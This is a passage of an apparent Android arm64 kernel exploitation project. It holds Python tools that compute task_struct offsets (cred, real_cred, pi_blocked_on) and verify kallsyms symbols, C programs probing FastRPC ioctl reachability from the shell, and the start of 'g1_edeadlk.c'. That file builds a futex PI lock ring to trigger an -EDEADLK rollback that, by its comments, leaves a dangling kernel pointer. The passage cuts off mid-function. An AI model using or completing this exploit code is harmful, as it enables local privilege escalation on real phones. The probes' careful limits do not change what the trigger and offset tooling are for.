```py
#!/usr/bin/env python3
# 4.9 task_struct 布局自动推导（无需 C 编译器）
#
# 思路：cffi 的 sizeof/offsetof 由内置 libffi 后端计算，只需提供合法 C 声明。
#   1) 按本机 k3_kernel_config.txt 展开 #if/#ifdef/#ifndef/#else/#elif/#endif
#   2) 清理 GNU 扩展（__attribute__ / __rcu / __user / cacheline 对齐等）
#   3) 解析 struct task_struct 字段（含数组、多变量声明、位域）
#   4) 为每个嵌套类型生成"大小+对齐"占位声明，交给 libffi 做对齐计算
#   5) 用已知 task_struct slab 大小 3840 (0xF00) 做终点校准
#
# 用法: python tools/f16_taskstruct_layout.py [--dump]
import re
import sys
import collections
from cffi import FFI

SCHED = "src_ref/futex_4.9/sched.h"
CONFIG = "artifacts_adb/k3_kernel_config.txt"


# ---------- 1) config ----------
def load_config(path):
    cfg = {}
    for line in open(path, encoding="utf-8", errors="ignore"):
        line = line.strip()
        if line.startswith("CONFIG_") and "=" in line:
            k, v = line.split("=", 1)
            cfg[k] = v.strip().strip('"')
        elif line.startswith("# CONFIG_") and line.endswith("is not set"):
            cfg[line.split()[1]] = None
    return cfg


CFG = load_config(CONFIG)


def cond(expr):
    e = expr.strip()
    e = re.sub(r"defined\s*\(\s*([A-Za-z0-9_]+)\s*\)",
               lambda m: "1" if CFG.get(m.group(1)) is not None else "0", e)
    e = re.sub(r"defined\s+([A-Za-z0-9_]+)",
               lambda m: "1" if CFG.get(m.group(1)) is not None else "0", e)
    e = re.sub(r"IS_ENABLED\s*\(\s*([A-Za-z0-9_]+)\s*\)",
               lambda m: "1" if CFG.get(m.group(1)) == "y" else "0", e)

    def repl(m):
        k = m.group(0)
        v = CFG.get(k)
        if v is None:
            return "0"
        if v in ("y", "m"):
            return "1"
        if re.fullmatch(r"0x[0-9a-fA-F]+|\d+", v):
            return str(int(v, 0))
        return "1"

    e = re.sub(r"\b[A-Za-z_][A-Za-z0-9_]*\b", repl, e)
    e = e.replace("&&", " and ").replace("||", " or ")
    e = re.sub(r"!(?!=)", " not ", e)
    try:
        return bool(eval(e, {"__builtins__": {}}, {}))
    except Exception:
        return False


def preprocess(text):
    out, stack, cur = [], [], True
    for line in text.splitlines():
        s = line.strip()
        if s.startswith("#"):
            m = re.match(r"#\s*(\w+)\s*(.*)", s)
            if not m:
                continue
            d, rest = m.group(1), m.group(2).strip()
            if d in ("ifdef", "ifndef"):
                v = cond(("" if d == "ifdef" else "!") + f"defined({rest})") if cur else False
                stack.append([cur, v, cur and v])
                cur = cur and v
            elif d == "if":
                v = cond(rest) if cur else False
                stack.append([cur, v, cur and v])
                cur = cur and v
            elif d == "elif":
                if stack:
                    p, taken, _ = stack[-1]
                    v = (not taken and cond(rest)) if p else False
                    stack[-1][1] = taken or v
                    stack[-1][2] = p and v
                    cur = p and v
            elif d == "else":
                if stack:
                    p, taken, _ = stack[-1]
                    stack[-1][1] = True
                    stack[-1][2] = p and (not taken)
                    cur = p and (not taken)
            elif d == "endif":
                if stack:
                    cur = stack.pop()[0]
            continue
        if cur:
            out.append(line)
    return "\n".join(out)


# ---------- 2) GNU 清理 ----------
def strip_attributes(s):
    while True:
        i = s.find("__attribute__")
        if i < 0:
            break
        j = s.find("(", i)
        if j < 0:
            s = s[:i] + s[i + len("__attribute__"):]
            continue
        depth, k = 0, j
        while k < len(s):
            if s[k] == "(":
                depth += 1
            elif s[k] == ")":
                depth -= 1
                if depth == 0:
                    break
            k += 1
        s = s[:i] + " " + s[k + 1:]
    return s


GUNK = [
    "__rcu", "__user", "__percpu", "__force", "__bitwise", "__nocast",
    "____cacheline_aligned_in_smp", "__cacheline_aligned_in_smp",
    "__cacheline_aligned", "asmlinkage", "__maybe_unused", "noinline",
    "__read_mostly", "__const", "__init", "__exit", "____cacheline_aligned",
]


def sanitize(text):
    text = re.sub(r"/\*.*?\*/", "", text, flags=re.S)
    text = re.sub(r"//[^\n]*", "", text)
    text = strip_attributes(text)
    for g in GUNK:
        text = re.sub(r"\b" + re.escape(g) + r"\b", " ", text)
    text = re.sub(r"\b__aligned\s*\([^)]*\)", " ", text)
    text = re.sub(r"\b__printf\s*\([^)]*\)", " ", text)
    return text


# ---------- 3) 类型表 ----------
# (C 等价声明, size, align)。size/align 为 4.9 arm64 LP64 下的值。
BASE = {
    "char": ("char", 1, 1), "signed char": ("signed char", 1, 1),
    "unsigned char": ("unsigned char", 1, 1),
    "short": ("short", 2, 2), "unsigned short": ("unsigned short", 2, 2),
    "int": ("int", 4, 4), "unsigned int": ("unsigned int", 4, 4),
    "unsigned": ("unsigned int", 4, 4),
    "long": ("long", 8, 8), "unsigned long": ("unsigned long", 8, 8),
    "long long": ("long long", 8, 8),
    "unsigned long long": ("unsigned long long", 8, 8),
    "void *": ("void *", 8, 8),
    "u8": ("unsigned char", 1, 1), "s8": ("signed char", 1, 1),
    "u16": ("unsigned short", 2, 2), "s16": ("short", 2, 2),
    "u32": ("unsigned int", 4, 4), "s32": ("int", 4, 4),
    "u64": ("unsigned long long", 8, 8), "s64": ("long long", 8, 8),
    "bool": ("_Bool", 1, 1), "_Bool": ("_Bool", 1, 1),
    "atomic_t": ("int", 4, 4), "atomic64_t": ("long long", 8, 8),
    "pid_t": ("int", 4, 4), "uid_t": ("unsigned int", 4, 4),
    "gid_t": ("unsigned int", 4, 4), "size_t": ("unsigned long", 8, 8),
    "gfp_t": ("unsigned int", 4, 4), "cputime_t": ("unsigned long long", 8, 8),
    "clockid_t": ("int", 4, 4), "timer_t": ("int", 4, 4),
    "seqcount_t": ("unsigned int", 4, 4), "seqlock_t": (None, 16, 8),
    "spinlock_t": ("unsigned int", 4, 4), "raw_spinlock_t": ("unsigned int", 4, 4),
    "arch_spinlock_t": ("unsigned int", 4, 4),
    "plist_node": (None, 40, 8), "list_head": (None, 16, 8),
    "llist_node": (None, 8, 8), "rb_node": (None, 24, 8),
    "rb_root": ("void *", 8, 8), "hlist_node": (None, 16, 8),
    "callback_head": (None, 16, 8), "rcu_head": (None, 16, 8),
    "thread_info": (None, 16, 8), "sigset_t": (None, 8, 8),
    "cpumask_t": (None, 8, 8), "cpumask_var_t": (None, 8, 8),
    "sched_entity": (None, 192, 8), "sched_rt_entity": (None, 48, 8),
    "sched_dl_entity": (None, 160, 8), "sched_class": (None, 88, 8),
    "ravg": (None, 64, 8), "latency_record": (None, 24, 8),
    "thread_struct": (None, 160, 16), "cred": (None, 168, 8),
    "ftrace_ret_stack": (None, 32, 8), "kcov": (None, 16, 8),
    "task_struct": ("void *", 8, 8), "uprobe_task": (None, 8, 8),
    "mem_cgroup": (None, 8, 8), "vm_struct": (None, 8, 8),
    "related_thread_group": (None, 8, 8), "perf_event_context": (None, 8, 8),
    "task_delay_info": (None, 8, 8), "prev_cputime": (None, 16, 8),
    "signal_struct": (None, 8, 8), "sighand_struct": (None, 8, 8),
    "files_struct": (None, 8, 8), "fs_struct": (None, 8, 8),
    "mm_struct": (None, 8, 8), "nsproxy": (None, 8, 8),
    "sysv_sem": (None, 8, 8), "sysv_shm": (None, 8, 8),
    "sem_undo_list": (None, 8, 8), "user_struct": (None, 8, 8),
    "group_info": (None, 8, 8), "task_io_accounting": (None, 64, 8),
    "acct": (None, 8, 8), "audit_context": (None, 8, 8),
    "seccomp": (None, 16, 8), "restart_block": (None, 48, 8),
    "task_cputime": (None, 24, 8), "load_weight": (None, 8, 8),
    "sched_statistics": (None, 8, 8), "rt_mutex_waiter": (None, 80, 8),
    "timer_list": (None, 40, 8), "hlist_head": ("void *", 8, 8),
    "wait_queue_head_t": (None, 24, 8), "completion": (None, 24, 8),
    "page_frag": (None, 16, 8), "tlbflush_unmap_batch": (None, 16, 8),
    "nodemask_t": (None, 8, 8), "mempolicy": (None, 8, 8),
    "pipe_inode_info": (None, 8, 8), "io_context": (None, 8, 8),
    "taskstats": (None, 8, 8), " blk_plug": (None, 8, 8),
}
# 枚举（4 字节）
ENUMS = {"kcov_mode": 4, "perf_event_task_context": 4}
MACROS = {"TASK_COMM_LEN": 16, "LT_SAVECOUNT": 32, "MAX_NUMNODES": 1,
          "CONFIG_NR_CPUS": 8, "NR_CPUS": 8, "TASK_SLACK": 0}


def placeholder(name, size, align):
    ctype = {1: "char", 2: "short", 4: "int", 8: "long long", 16: "long long"}[align]
    return f"struct {name} {{ union {{ {ctype} _a; char _p[{size}]; }} _u; }};"


def type_to_c(texpr):
    """把字段类型表达式转成 (C声明, 未知类型列表)"""
    t = re.sub(r"\b(const|volatile)\b", "", texpr).strip()
    t = re.sub(r"\s+", " ", t)
    ptr = t.count("*")
    core = t.replace("*", "").strip()
    unknown = []
    if ptr:
        return "void *", unknown
    # struct/union/enum
    m = re.match(r"^(struct|union|enum)\s+([A-Za-z0-9_]+)$", core)
    if m:
        kind, name = m.group(1), m.group(2)
        if kind == "enum":
            return "unsigned int", unknown
        if name in BASE and BASE[name][0] is not None:
            return BASE[name][0], unknown
        if name in BASE:
            return f"struct {name}", unknown
        unknown.append(name)
        BASE[name] = (None, 8, 8)   # 首轮占位，后续校准
        return f"struct {name}", unknown
    if core in BASE:
        return BASE[core][0] if BASE[core][0] else f"struct {core}", unknown
    if core in ENUMS:
        return "unsigned int", unknown
    # typedef 未知
    unknown.append(core)
    BASE[core] = (None, 8, 8)
    return f"struct {core}", unknown


# ---------- 4) 解析字段 ----------
def parse_fields(body):
    body = re.sub(r"/\*.*?\*/", "", body, flags=re.S)
    # 去掉预处理后残留的宏/属性
    body = sanitize(body)
    decls, buf = [], ""
    # 按分号切分（task_struct 体内无嵌套定义）
    for chunk in body.split(";"):
        s = " ".join(chunk.split())
        if not s or s.startswith("#"):
            continue
        # 去掉可能残留的 "struct xxx {" 之类（不应出现）
        decls.append(s)
    return decls


def split_top(s, sep=","):
    """按顶层逗号切分（忽略 [] 与 () 内的逗号）"""
    parts, buf, depth = [], "", 0
    for ch in s:
        if ch in "[(":
            depth += 1
        elif ch in "])":
            depth -= 1
        if ch == sep and depth == 0:
            parts.append(buf.strip()); buf = ""
        else:
            buf += ch
    if buf.strip():
        parts.append(buf.strip())
    return parts


def parse_decl(d):
    """解析一条声明 -> [(类型表达式, 名字, 数组或None, 位域或None)]"""
    s = d.strip()
    bits = None
    m = re.search(r":\s*(\d+)\s*$", s)
    if m:
        bits = int(m.group(1))
        s = s[:m.start()].rstrip()
    parts = split_top(s)
    out, base_type = [], None
    NAME = r"^(?P<type>.*?)\s*(?P<stars>\*+)?\s*(?P<name>[A-Za-z_][A-Za-z0-9_]*)\s*(?P<arr>\[[^\]]*\])?$"
    for i, p in enumerate(parts):
        p = p.strip()
        mm = re.match(NAME, p)
        if not mm:
            continue
        typ = (mm.group("type") + " " + (mm.group("stars") or "")).strip()
        if i > 0:
            typ = base_type or typ
        if i == 0:
            base_type = typ
        nm = mm.group("name")
        if nm in ("unsigned", "signed", "long", "short", "int", "char",
                  "struct", "union", "enum", "const", "volatile"):
            # 匿名位域 / 纯类型：忽略
            continue
        out.append((typ, nm, mm.group("arr"), bits if i == 0 else None))
    return out


def main():
    src = open(SCHED, encoding="utf-8", errors="ignore").read()
    m = re.search(r"struct task_struct \{(.*?)\n\};", src, re.S)
    if not m:
        sys.exit("[!] struct task_struct not found")
    body = "\n".join(preprocess(m.group(1)).splitlines())
    decls = parse_fields(body)
    print(f"[*] config entries={len(CFG)}  preprocessed field decls={len(decls)}")

    ffi = FFI()
    cdef_parts, lines, unknown = [], [], []
    # 占位声明（每次循环重建，因为 BASE 可能被追加）
    for name, (cdecl, size, align) in list(BASE.items()):
        if cdecl is None:
            cdef_parts.append(placeholder(name, size, align))
    ffi.cdef("\n".join(cdef_parts))

    # 生成 task_struct 字段
    flds, failed = [], []
    for d in decls:
        parsed = parse_decl(d)
        if not parsed:
            failed.append(d)
            continue
        for texpr, name, arr, bits in parsed:
            ctype, unk = type_to_c(texpr)
            unknown += unk
            decl = f"  {ctype} {name}"
            if arr:
                n = arr.strip("[]").strip()
                for k, v in MACROS.items():
                    n = n.replace(k, str(v))
                try:
                    n = str(eval(n, {"__builtins__": {}}, {}))
                except Exception:
                    n = "1"
                decl += f"[{n}]"
            elif bits:
                decl += f" : {bits}"
            flds.append((name, decl))
            lines.append(decl + ";")
    if failed:
        print(f"[*] 未解析 decl {len(failed)} 条: " + " | ".join(failed[:8]))

    # 未知类型可能在第一轮才加入 BASE，需要重建 cdef
    ffi2 = FFI()
    cdef2 = [placeholder(n, s, a) for n, (c, s, a) in BASE.items() if c is None]
    ffi2.cdef("\n".join(cdef2))
    ffi2.cdef("struct task_struct {\n" + "\n".join(lines) + "\n};")

    print(f"[*] parsed fields={len(flds)}  nested types={sum(1 for c,s,a in BASE.values() if c is None)}")
    print(f"[*] unknown/placeholder types: {sorted(set(unknown))}")
    print(f"\n[*] sizeof(struct task_struct) = {ffi2.sizeof('struct task_struct')}"
          f"  (target slab size 3840 / 0xF00)")
    for f in ("cred", "real_cred", "ptracer_cred", "pi_blocked_on",
              "pi_waiters", "pi_waiters_leftmost", "comm", "thread"):
        try:
            print(f"    offsetof({f:20s}) = 0x{ffi2.offsetof('struct task_struct', f):x}"
                  f" ({ffi2.offsetof('struct task_struct', f)})")
        except Exception as e:
            print(f"    offsetof({f:20s}) = N/A ({e})")
    if "--dump" in sys.argv:
        print("\n[*] 字段列表：")
        for n, d in flds:
            print("   ", d.strip())


if __name__ == "__main__":
    main()
```

`tools/f16_verify.py`:

```py
#!/usr/bin/env python3
# F.16 符号配对交叉验证：用函数内 bl 目标 + 字符串引用判断「名字↔值」是否自洽
#
# 判据：
#   * 若 SyS_futex 声称处 bl 到 do_futex 声称处 → futex 区段配对自洽
#   * 若 arm_lpae_map_sg 声称处是 arm-smmu 探测代码 → 该簇确有错位
#   * 复现 §11.2 的 ADRP/ADD 字符串引用，确认不是判读误差
# 用法: python tools/f16_verify.py
import re
import struct
import numpy as np
from capstone import Cs, CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN

P = "firmware_F16/kernel.decompressed"
K = "firmware_F16/kallsyms_out.txt"
D = open(P, "rb").read()
N = len(D)
u32 = lambda o: struct.unpack_from("<I", D, o)[0]
MD = Cs(CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN)
MD.detail = False

SY = []
for line in open(K, encoding="latin1"):
    line = line.rstrip("\n")
    if len(line) >= 13:
        SY.append((int(line[:10], 16), line[11], line[12:]))
KV = {nm: v for v, t, nm in SY}
VALS = sorted(set(v for v, t, nm in SY if 0 < v < N))
BYVAL = {}
for v, t, nm in SY:
    BYVAL.setdefault(v, []).append((t, nm))


def name_at(v):
    return "/".join(nm for t, nm in BYVAL.get(v, [])[:3]) or "?"


def next_sym(v):
    import bisect
    i = bisect.bisect_right(VALS, v)
    return VALS[i] if i < len(VALS) else v + 0x400


def cstr(o, maxlen=100):
    if not (0 <= o < N):
        return None
    e = D.find(b"\x00", o, min(N, o + maxlen))
    if e < 0 or e == o:
        return None
    s = D[o:e]
    if len(s) > maxlen or any(c < 32 or c > 126 for c in s):
        return None
    return s.decode("ascii")


def analyze(nm, limit=0x300):
    v = KV.get(nm)
    if v is None:
        print(f"  {nm}: 符号不存在")
        return
    end = min(v + limit, next_sym(v) + 4, N)
    ins = list(MD.disasm(D[v:end], v))
    bls = []
    strs = []
    regs = {}
    for x in ins:
        op = x.op_str.replace("#", "").strip()
        if x.mnemonic == "bl" or (x.mnemonic == "b" and x.address > v + 8):
            m = re.search(r"0x[0-9a-f]+", op)
            if m:
                t = int(m.group(), 16)
                bls.append((t, name_at(t)))
        elif x.mnemonic == "adrp":
            p = [s.strip() for s in op.split(",")]
            if len(p) == 2:
                try:
                    regs[p[0]] = int(p[1], 16)
                except ValueError:
                    pass
        elif x.mnemonic in ("add", "ldr") and "," in op:
            p = [s.strip() for s in op.split(",")]
            if len(p) >= 3 and p[1] in regs and p[2].startswith("0x"):
                try:
                    addr = regs[p[1]] + int(p[2], 16)
                    s = cstr(addr)
                    if s:
                        strs.append((addr, s))
                except ValueError:
                    pass
    head = " | ".join(f"{x.mnemonic} {x.op_str}".strip() for x in ins[:5])
    print(f"  {nm} @0x{v:x} (下一个符号 0x{next_sym(v):x})")
    print(f"    前5条: {head}")
    if bls:
        print(f"    bl/b 目标: " + ", ".join(f"0x{t:x}={n}" for t, n in bls[:8]))
    if strs:
        print(f"    字符串引用: " + ", ".join(f"0x{a:x}={s!r}" for a, s in strs[:8]))


TARGETS = [
    "SyS_futex", "do_futex", "futex_requeue", "futex_lock_pi",
    "remove_waiter", "task_blocks_on_rt_mutex", "rt_mutex_start_proxy_lock",
    "arm_lpae_map_sg", "arm_lpae_map", "__arm_lpae_map", "arm_lpae_init_pte",
    "arm_smmu_device_probe", "arm_smmu_domain_alloc", "kgsl_iommu_map",
    "kgsl_mmu_set_svm_region", "kgsl_memdesc_get_align",
    "kgsl_ioctl_gpuobj_alloc", "kgsl_ioctl_map_user_mem",
]
print("=== 1. 目标函数交叉引用 ===")
for nm in TARGETS:
    analyze(nm)

print("\n=== 2. §11.2 反例复现：0x5bf650 起的 ADRP/ADD 字符串引用 ===")
start, end = 0x5bf650, 0x5bf650 + 0x700
regs = {}
for x in MD.disasm(D[start:end], start):
    op = x.op_str.replace("#", "").strip()
    if x.mnemonic == "adrp":
        p = [s.strip() for s in op.split(",")]
        if len(p) == 2:
            try:
                regs[p[0]] = int(p[1], 16)
            except ValueError:
                pass
    elif x.mnemonic == "add" and "," in op:
        p = [s.strip() for s in op.split(",")]
        if len(p) >= 3 and p[1] in regs and p[2].startswith("0x"):
            try:
                addr = regs[p[1]] + int(p[2], 16)
                s = cstr(addr)
                if s and len(s) > 3:
                    print(f"    0x{x.address:x} add -> 0x{addr:x}  {s!r}")
            except ValueError:
                pass

print("\n=== 3. arm_lpae_* / arm_smmu_* / io_pgtable 符号值分布 ===")
for pref in ("arm_lpae_", "__arm_lpae_", "arm_smmu_", "io_pgtable_",
             "kgsl_memdesc_get_align", "kgsl_iommu_"):
    s = sorted((v, nm) for v, t, nm in SY if nm.startswith(pref))
    print(f"    {pref}: {len(s)} 个, 值域 "
          + (f"0x{s[0][0]:x}..0x{s[-1][0]:x}" if s else "-"))
    if s:
        print("      " + ", ".join(f"{nm}@{hex(v)}" for v, nm in s[:6]))

print("\n=== 4. 与 0x10a6000 同值的符号 / vectors 附近符号 ===")
for v0 in (0x10a6000, 0x6720, 0x1189b88, 0x5bf650):
    print(f"    值 0x{v0:x}: {name_at(v0)}")
s = sorted((v, nm) for v, t, nm in SY if 0x6600 <= v <= 0x6900)
print("    kallsyms 0x6600..0x6900: " +
      ", ".join(f"{nm}@{hex(v)}" for v, nm in s[:20]))
```

`tools/frpc_ioctl_probe.c`:

```c
/*
 * frpc_ioctl_probe.c — FastRPC ioctl 表与 FMODE 门槛判定（零副作用）
 *
 * 要回答的唯一问题：
 *   shell 以 **O_RDONLY** 打开的 /dev/adsprpc-smd fd，其 ioctl 是否能进到具体 handler？
 *   （若驱动/闸门要求 FMODE_WRITE，会在 copy_from_user 之前就返回 EACCES/EPERM/EBADF）
 *
 * 方法：
 *   驱动的 adsprpc_ioctl 用 switch(cmd) 精确匹配，而 _IOWR/_IOW 宏把 sizeof(struct) 编进了
 *   cmd 的 size 位。所以不知道结构体大小时必须枚举 size —— 扫 nr × size × dir 的笛卡尔积，
 *   每个组合发一个 **arg = NULL** 的 ioctl：
 *       ENOTTY  → 该 (nr,size,dir) 在驱动里不存在（正常，绝大多数）
 *       其它     → 命中！NULL 指针会在 copy_from_user 第一步就 -EFAULT 返回
 *
 * 安全边界（硬约束，不可放宽）：
 *   - **跳过 nr = 5（INIT_ATTACH，_IO 无参）与 nr = 6（FINISH）**
 *   - **跳过所有 dir = _IO（无方向位）的组合** —— 无参命令不会因 NULL 而提前返回
 *   - 只对 O_RDONLY fd 发；不打开 -secure 节点
 *   - 全程不构造任何真实请求，不触碰 DSP
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define DEVPATH "/dev/adsprpc-smd"

/* 与内核 _IOC_* 一致的位域（arm64 通用） */
#define DIR_NONE 0u
#define DIR_WRITE 1u
#define DIR_READ  2u
#define DIR_RW    3u

static unsigned int mkcmd(unsigned int dir, unsigned int nr, unsigned int size)
{
	return (dir << 30) | (size << 16) | ((unsigned int)'R' << 8) | nr;
}

int main(void)
{
	static const unsigned int nrs[] = { 0, 1, 2, 3, 4, 7, 8, 9 };
	static const unsigned int dirs[] = { DIR_READ, DIR_WRITE, DIR_RW };
	int fd, i, j, k;
	int hits = 0, enotty = 0, other = 0;

	printf("===== FRPC-IOCTL-PROBE uid=%d =====\n", getuid());

	fd = open(DEVPATH, O_RDONLY);
	if (fd < 0) { printf("open(%s, O_RDONLY) 失败 errno=%d\n", DEVPATH, errno); return 1; }
	printf("open(%s, O_RDONLY) = fd %d（只读 fd，不加 O_RDWR）\n\n", DEVPATH, fd);

	for (i = 0; i < (int)(sizeof(nrs)/sizeof(nrs[0])); i++) {
		for (k = 0; k < (int)(sizeof(dirs)/sizeof(dirs[0])); k++) {
			for (j = 1; j <= 160; j++) {
				unsigned int cmd;
				int e;

				if (nrs[i] == 5 || nrs[i] == 6) continue;   /* 硬约束：不碰 */
				if (dirs[k] == DIR_NONE) continue;

				cmd = mkcmd(dirs[k], nrs[i], (unsigned int)j);
				errno = 0;
				ioctl(fd, cmd, NULL);
				e = errno;

				if (e == ENOTTY) { enotty++; continue; }
				hits++;
				if (e != EFAULT && e != EINVAL) other++;
				printf("  命中: nr=%u dir=%u size=%3d cmd=0x%08x -> %s\n",
				       nrs[i], dirs[k], j, cmd,
				       e == EFAULT ? "EFAULT(14)  ← NULL 参数在 copy_from_user 提前返回"
				     : e == EINVAL ? "EINVAL(22)  ← handler 已进入，参数校验失败"
				     : e == EACCES ? "EACCES(13)  ← 闸门拒绝"
				     : e == EPERM  ? "EPERM(1)    ← 能力/策略拒绝"
				     : e == EBADF  ? "EBADF(9)    ← fd 模式不符（FMODE_WRITE 门槛）"
				     : "其它");
			}
		}
	}

	printf("\n---- 汇总 ----\n");
	printf("  ENOTTY（未实现）: %d\n", enotty);
	printf("  命中（非 ENOTTY）: %d   其中非 EFAULT/EINVAL: %d\n", hits, other);
	if (hits == 0)
		printf("  >> 结论：只读 fd 上没有任何可命中的 ioctl ⇒ FastRPC 面对 shell **关闭**\n");
	else if (other == 0)
		printf("  >> 结论：**只读 fd 可进入 handler**（命中且均 EFAULT/EINVAL，未触碰 DSP）"
		       " ⇒ FMODE_WRITE 门槛不存在，FastRPC 面**开放**\n");
	else
		printf("  >> 结论：混合结果，见上表逐条判读\n");
	printf("===== done（未向 DSP 发送任何请求） =====\n");
	close(fd);
	return 0;
}

```

`tools/frpc_probe.c`:

```c
/*
 * frpc_probe.c — FastRPC 面可达性探测（只读 / 零副作用）
 *
 * 目的：把 §5.2「第 4 名：/dev/adsprpc*，shell 可达性未测」这一条填上。
 *
 * 只做三件事，绝不向 DSP 发任何请求：
 *   1. open(O_RDONLY) / open(O_RDWR) —— 字符设备的 FMODE 门槛
 *   2. ioctl(fd, 0)               —— 未实现命令号。返回 ENOTTY 说明**已穿过 LSM 闸门**
 *                                    （SELinux 的 file_ioctl hook 在驱动之前，会返 EACCES/EPERM）
 *   3. 对 -secure 节点做同样的 open 试探（预期被 0640 挡住）
 *
 * 明确不做：FASTRPC_IOCTL_INIT / INVOKE / MMAP / FINISH —— 那些会真的创建 DSP 上下文，
 * 属于"对该面动手"，需单独授权。本程序只回答"能不能碰到驱动的 ioctl 入口"。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

static const char *errname(int e)
{
	static char b[64];
	switch (e) {
	case 0: return "OK";
	case EPERM: return "EPERM(1) SELinux/能力";
	case EACCES: return "EACCES(13) SELinux/权限";
	case ENOTTY: return "ENOTTY(25) 已到驱动但无该命令";
	case ENODEV: return "ENODEV(19)";
	case ENOSYS: return "ENOSYS(38)";
	case EFAULT: return "EFAULT(14)";
	case EINVAL: return "EINVAL(22)";
	}
	snprintf(b, sizeof(b), "errno=%d", e);
	return b;
}

static void probe(const char *path)
{
	int fd, e;
	char tag[64];

	printf("== %s ==\n", path);

	/* 1. O_RDONLY */
	errno = 0;
	fd = open(path, O_RDONLY);
	e = errno;
	printf("  open(O_RDONLY)      -> %d  %s\n", fd, errname(e));
	if (fd >= 0) {
		errno = 0;
		ioctl(fd, 0);
		e = errno;
		printf("  ioctl(fd, 0)        -> %s\n", errname(e));
		printf("  >> %s\n", (e == ENOTTY)
		       ? "结论：ioctl 已穿过 SELinux 闸门（驱动收到未实现命令）"
		       : (e == EACCES || e == EPERM)
		         ? "结论：SELinux 拒绝该 fd 上的 ioctl"
		         : "结论：其它返回，需按 errno 判读");
		close(fd);
	}

	/* 2. O_RDWR */
	errno = 0;
	fd = open(path, O_RDWR);
	e = errno;
	printf("  open(O_RDWR)        -> %d  %s\n", fd, errname(e));
	if (fd >= 0) {
		errno = 0;
		ioctl(fd, 0);
		e = errno;
		printf("  ioctl(fd, 0)        -> %s\n", errname(e));
		close(fd);
	}
	snprintf(tag, sizeof(tag), "  >> %s", "（O_RDWR 成功才意味着多数 FastRPC ioctl 的 FMODE_WRITE 门槛不存在）");
	printf("%s\n", tag);
	printf("\n");
}

int main(void)
{
	printf("===== FRPC-PROBE start uid=%d =====\n", getuid());
	probe("/dev/adsprpc-smd");
	probe("/dev/adsprpc-smd-secure");
	printf("===== done（未向 DSP 发送任何请求） =====\n");
	return 0;
}

```

`tools/g1_edeadlk.c`:

```c
/*
 * g1_edeadlk.c — GhostLock G-1：验证能否进入 -EDEADLK 回滚点（漏洞必经点）
 *
 * 目标构造（三锁环，对应 §15.5 与 rtmutex.c 的分析）：
 *
 *   B = PI futex，由 W 持有
 *   C = PI futex，由 O 持有
 *   A = 普通 futex，作为 W 的 requeue 等待点
 *
 *   W: FUTEX_LOCK_PI(B)            → B 归 W
 *   O: FUTEX_LOCK_PI(C)            → C 归 O
 *   O: FUTEX_LOCK_PI(B)            → 阻塞（入队 B，O->pi_blocked_on 被置位）
 *   W: FUTEX_WAIT_REQUEUE_PI(A→C)  → W 睡在 A 上，rt_waiter 在 W 的内核栈
 *   R(主线程): FUTEX_CMP_REQUEUE_PI(A→C, nr_wake=1)
 *
 *   → rt_mutex_start_proxy_lock(C, waiter=W的rt_waiter, task=W)
 *     try_to_take 失败（C 的 owner 是 O，不是 W）
 *     task_blocks_on_rt_mutex → 入队成功、waiter->task=W、W->pi_blocked_on=&waiter
 *     → 链走查：C.owner=O → O 阻塞在 B → B.owner=W == 正在入队的 task
 *     → 命中 rtmutex.c:644 的死锁判定 → 返回 -EDEADLK
 *   → rt_mutex_start_proxy_lock: ret 非 0 且 owner 非 NULL → remove_waiter(C, waiter)
 *     此时 current = R，而 waiter->task = W
 *     → 清的是 R->pi_blocked_on（错误对象）
 *     → **W->pi_blocked_on 保持指向 &waiter，W 返回用户态后即悬垂**
 *
 * 判据：R 的 FUTEX_CMP_REQUEUE_PI 返回 -1 / EDEADLK(35)。
 *
 * 安全：触发后不做任何 PI 操作，立即 _exit；每步 fsync 落盘。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/mman.h>

#define LOGPATH "/data/local/tmp/g1.log"

/* linux/futex.h 常量（避免依赖头文件版本） */
#define FUTEX_WAIT            0
#define FUTEX_WAKE            1
#define FUTEX_LOCK_PI         6
#define FUTEX_UNLOCK_PI       7
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI  12
#define FUTEX_PRIVATE_FLAG    128

static int logfd = -1;

static double now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

static void lg(const char *fmt, ...)
{
	char buf[300], line[360];
	va_list ap;
	int n;

	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	n = snprintf(line, sizeof(line), "[%8.1fms] %s\n", now_ms(), buf);
	if (write(1, line, n) < 0) { }
	if (logfd >= 0 && write(logfd, line, n) < 0) { }
}

static void sync_log(void)
{
	if (logfd >= 0)
		fsync(logfd);
}

static long futex(uint32_t *uaddr, int op, uint32_t val, void *timeout,
		  uint32_t *uaddr2, uint32_t val3)
{
	return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

/* 共享状态（线程间可见） */
struct shared {
	uint32_t A; /* 普通 futex */
	uint32_t C; /* PI futex，由 O 持有 */
	uint32_t B; /* PI futex，由 W 持有 */
	volatile int b_held;
	volatile int c_held;
	volatile int o_blocked;
	volatile int w_waiting;
};

static struct shared *S;
static int noring; /* 1 = 对照组：O 不阻塞到 B 上，PI 环不成立 */

static void *thread_w(void *arg)
{
	long r;

	(void)arg;
	/* 1) W 取得 B */
	errno = 0;
	r = futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	lg("W: LOCK_PI(B) → %ld errno=%d", r, errno);
	if (r != 0) {
		lg("W: 无法取得 B，退出");
		return NULL;
	}
	S->b_held = 1;
	__sync_synchronize();

	/* 等 O 已被阻塞在 B 上，再进入 requeue 等待 */
	while (!S->o_blocked)
		__asm__ __volatile__("" ::: "memory");

	/* 2) W 在普通 futex A 上等待被 requeue 到 C */
	S->w_waiting = 1;
	__sync_synchronize();
